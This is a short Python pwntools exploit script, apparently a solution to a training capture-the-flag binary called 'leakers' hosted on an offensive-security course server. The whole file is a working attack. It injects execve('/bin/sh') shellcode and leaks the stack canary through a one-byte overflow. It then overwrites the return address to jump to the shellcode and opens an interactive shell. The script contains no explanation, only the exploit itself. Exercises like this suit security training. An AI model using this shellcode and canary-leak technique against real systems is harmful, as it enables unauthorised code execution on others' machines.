from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 2010)
else:
    r = process("./leakers")
    gdb.attach(r, """
    b *0x401316
    c
    """)

input("wait")

r.sendline(b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x0f\x05\x24")
time.sleep(0.5)
r.send(b"a"*104+b"\xff")
time.sleep(0.5)
r.recvuntil(b"> ")
r.recv(105)
canary = r.recv(7)
canary = b"\x00" + canary
print("The canary is ", canary.hex())
r.send(b"a"*104+canary+b"x"*8+b"\xa0\x40\x40\x00\x00\x00\x00\x00")
time.sleep(0.5)
r.sendline(b"")

r.interactive()
